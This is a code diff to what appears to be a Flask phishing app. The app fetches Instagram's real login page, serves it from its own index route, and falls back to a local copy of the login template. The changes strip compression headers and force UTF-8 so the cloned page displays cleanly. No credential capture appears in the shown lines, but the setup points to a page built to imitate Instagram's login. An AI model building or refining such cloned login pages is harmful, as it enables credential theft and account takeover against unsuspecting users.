@@ -40,13 +40,14 @@ def fetch_instagram_login_page():
             'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
             'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
             'Accept-Language': 'en-US,en;q=0.5',
-            'Accept-Encoding': 'gzip, deflate, br',
             'DNT': '1',
             'Connection': 'keep-alive',
             'Upgrade-Insecure-Requests': '1'
         }
         
+        # Note: Removed Accept-Encoding to get uncompressed response
         response = requests.get('https://www.instagram.com/accounts/login/', headers=headers, timeout=10)
+        response.encoding = 'utf-8'  # Ensure proper encoding
         
         if response.status_code == 200:
             soup = BeautifulSoup(response.text, 'html.parser')
@@ -180,7 +181,14 @@ def index():
     instagram_html = fetch_instagram_login_page()
     
     if instagram_html:
-        return Response(instagram_html, mimetype='text/html')
+        return Response(
+            instagram_html, 
+            mimetype='text/html',
+            headers={
+                'Content-Type': 'text/html; charset=utf-8',
+                'Content-Encoding': 'identity'  # Ensure no compression
+            }
+        )
     else:
         # Fallback to our custom template
         return render_template('instagram_login.html')
